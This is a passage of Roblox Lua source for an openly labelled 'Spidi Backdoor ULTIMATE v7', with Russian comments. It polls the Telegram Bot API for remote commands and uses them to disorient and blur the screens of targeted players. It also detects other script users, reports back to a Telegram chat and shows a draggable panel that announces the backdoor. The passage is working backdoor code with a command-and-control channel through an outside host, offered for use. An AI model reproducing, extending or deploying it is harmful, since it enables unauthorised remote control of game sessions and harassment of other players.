    end
    
    if cmd == "des" then
        desorientPlayer(target)
        sendMessage("🌀 Дезориентация камеры (3 сек): <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "warp" then
        local level = tonumber(args[2]) or 5
        level = math.clamp(level, 1, 10)
        local blur = Lighting:FindFirstChild("SpidiWarp")
        if not blur then
            blur = Instance.new("BlurEffect")
            blur.Name = "SpidiWarp"
            blur.Parent = Lighting
        end
        blur.Size = level * 3
        sendMessage("🌀 Размытие "..level.."/10 на <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "unwarp" then
        local blur = Lighting:FindFirstChild("SpidiWarp")
        if blur then
            blur:Destroy()
            sendMessage("✅ Размытие убрано у <b>"..target.Name.."</b>")
        else
            sendMessage("❌ Нет активного размытия у <b>"..target.Name.."</b>")
        end
        return
    end
    
    sendMessage("❌ Неизвестная команда. /help")
end

-- ==================== УВЕДОМЛЕНИЕ О НОВЫХ ИГРОКАХ ====================
local oldPlayers = {}
local function checkNewPlayers()
    for _, p in pairs(Players:GetPlayers()) do
        if not oldPlayers[p.UserId] then
            local success, hasScript = pcall(function()
                return p:FindFirstChild("SpidiUser")
            end)
            if success and hasScript then
                addScriptUser(p)
            end
        end
        oldPlayers[p.UserId] = true
    end
end

spawn(function()
    while true do
        pcall(checkNewPlayers)
        wait(3)
    end
end)

-- ==================== ОПРОС TELEGRAM ====================
local lastId = 0
local function pollUpdates()
    local res = httpRequest("https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates?offset="..(lastId+1))
    if res and res.Body then
        local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
        if ok and data and data.result then
            for _, update in pairs(data.result) do
                if update.message and update.message.text then
                    local msg = update.message
                    if not CHAT_ID then
                        CHAT_ID = msg.chat.id
                        sendMessage("✅ Spidi Backdoor ULTIMATE v7 запущен!\n👤 Hacker228")
                    end
                    local text = msg.text
                    if text:sub(1,1) == "/" then
                        local parts = {}
                        for w in string.gmatch(text, "%S+") do table.insert(parts, w) end
                        local cmd = parts[1]:sub(2):lower()
                        table.remove(parts, 1)
                        handleCommand(cmd, parts, msg.from.username)
                    end
                end
                if update.update_id then lastId = update.update_id end
            end
        end
    end
end

spawn(function()
    while true do
        pcall(pollUpdates)
        wait(2)
    end
end)

-- ==================== GUI ====================
local function createGUI()
    local player = Players.LocalPlayer
    if not player then return end
    
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then
        gui = Instance.new("PlayerGui")
        gui.Parent = player
    end
    
    local screen = Instance.new("ScreenGui")
    screen.Name = "Spidi Backdoor"
    screen.ResetOnSpawn = false
    screen.Parent = gui
    
    local frame = Instance.new("Frame")
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.Size = UDim2.new(0, 482, 0, 276)
    frame.Position = UDim2.new(0.5, -241, 0.5, -138)
    frame.Active = true
    frame.Parent = screen
    
    local stroke = Instance.new("UIStroke")
    stroke.Thickness = 2
    stroke.Color = Color3.fromRGB(255, 255, 255)
    stroke.Parent = frame
    
    local grad = Instance.new("UIGradient")
    grad.Rotation = 50
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 0))
    })
    grad.Parent = stroke
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = frame
    
    local title = Instance.new("TextLabel")
    title.BackgroundTransparency = 1
    title.Size = UDim2.new(1, 0, 0, 50)
    title.Position = UDim2.new(0, 0, 0, 10)
    title.Text = "Spidi Backdoor ULTIMATE v7"
    title.TextColor3 = Color3.fromRGB(0, 255, 0)
    title.TextSize = 28
    title.Font = Enum.Font.GothamBold
    title.TextXAlignment = Enum.TextXAlignment.Center
    title.Parent = frame
    
    local desc = Instance.new("TextLabel")
    desc.BackgroundTransparency = 1
    desc.Size = UDim2.new(1, -40, 0, 80)
    desc.Position = UDim2.new(0, 20, 0, 70)
    desc.Text = "Spidi Backdoor Active!\n/sp - выбрать игрока"
    desc.TextColor3 = Color3.fromRGB(0, 255, 0)
    desc.TextSize = 18
    desc.Font = Enum.Font.GothamBold
    desc.TextWrapped = true
    desc.TextXAlignment = Enum.TextXAlignment.Center
    desc.Parent = frame
    
    local btn = Instance.new("TextButton")
    btn.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
    btn.Size = UDim2.new(0, 140, 0, 40)
    btn.Position = UDim2.new(0.5, -70, 0.75, 0)
    btn.Text = "OK"
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextSize = 18
    btn.Font = Enum.Font.GothamBold
    btn.Parent = frame
    
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 6)
    btnCorner.Parent = btn
    
    btn.MouseButton1Click:Connect(function()
        screen:Destroy()
    end)
    
    local drag = false
    local startPos, startMouse, dragInput
    
    frame.InputBegan:Connect(function(inp)
        if (inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch) and not UserInputService:GetFocusedTextBox() then
            drag = true
            startPos = frame.Position
            startMouse = inp.Position
            inp.Changed:Connect(function()
                if inp.UserInputState == Enum.UserInputState.End then
                    drag = false
                end
            end)
        end
    end)
    
    frame.InputChanged:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then
            dragInput = inp
        end
    end)
    
    UserInputService.InputChanged:Connect(function(inp)
        if inp == dragInput and drag then
            local delta = inp.Position - startMouse
            frame.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)
end

local function onCharacterChanged()
    wait(1)
    if not Players.LocalPlayer.Character then
        wait(2)
        createGUI()
    end
end

-- ==================== ЗАПУСК ====================
createGUI()
Players.LocalPlayer:GetPropertyChangedSignal("Character"):Connect(onCharacterChanged)

wait(3)
getChatId()

if CHAT_ID then
    sendMessage("✅ Spidi Backdoor ULTIMATE v7 запущен!\n👤 Hacker228\n📋 /sp - выбрать игрока, /help - все команды")
end

